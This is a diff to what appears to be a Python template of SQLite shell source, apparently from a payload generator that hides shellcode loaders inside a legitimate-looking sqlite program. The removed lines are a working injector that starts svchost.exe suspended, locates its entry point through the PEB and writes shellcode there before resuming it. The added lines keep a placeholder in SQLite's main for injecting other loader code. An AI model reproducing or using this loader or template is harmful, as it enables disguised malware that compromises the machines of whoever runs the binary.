@@ -199418,78 +199418,11 @@ int SQLITE_CDECL wmain(int argc, wchar_t **wargv){{
 }}
 #endif
 
-NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG) = NULL;
-
 {codeblocks}
 
 int SQLITE_CDECL main(int argc, char **argv){{
-
   
-  {transformers}
-
-    pNtQueryInformationProcess = (NTSTATUS(NTAPI*)(HANDLE, /*enum _PROCESSINFOCLASS*/DWORD, PVOID, ULONG, PULONG))
-        GetProcAddress(
-            GetModuleHandle(TEXT("ntdll.dll")), 
-            TEXT("NtQueryInformationProcess"));
-    
-    STARTUPINFOA si = {{
-        sizeof(si)
-    }}; 
-    PROCESS_INFORMATION pi; 
-
-    PPEB pPeb;
-    PVOID pImage, pEntry;
-    PIMAGE_NT_HEADERS pNtHeaders;
-    LONG e_lfanew;
-    SIZE_T NumberOfBytesRead;
-    DWORD AddressOfEntryPoint;
-
-    CreateProcessA(NULL, (LPSTR) "C:\\\\windows\\\\system32\\\\svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
-
-    NTSTATUS status;
-    PROCESS_BASIC_INFORMATION pbi;
-
-    memset(&pbi, 0, sizeof(pbi));
-
-    status = pNtQueryInformationProcess(
-    pi.hProcess,
-    ProcessBasicInformation,
-    &pbi,
-    sizeof(pbi),
-    NULL);
-
-    pPeb = pbi.PebBaseAddress;
-
-    ReadProcessMemory(
-        pi.hProcess,
-        &pPeb->Reserved3[1],
-        &pImage,
-        sizeof(pImage),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pImage);
-
-        
-    ReadProcessMemory(
-        pi.hProcess,
-        (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
-        &e_lfanew,
-        sizeof(e_lfanew),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(e_lfanew);
-    pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
-
-    ReadProcessMemory(
-        pi.hProcess,
-        (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
-        &AddressOfEntryPoint,
-        sizeof(AddressOfEntryPoint),
-        &NumberOfBytesRead) || NumberOfBytesRead != sizeof(pEntry);
-    pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
-    
-    WriteProcessMemory(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);
-
-    ResumeThread(pi.hThread);
-
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
+  {template}
 
 #ifdef SQLITE_DEBUG
   sqlite3_int64 mem_main_enter = 0;
@@ -200220,5 +200153,11 @@ void fiddle_exec(const char * zSql){{
   }}
 }}
 #endif
+
+int wmain(int argc, char **argv){{
+  main(argc, argv);
+  return 0;
+}}
+
 
 """
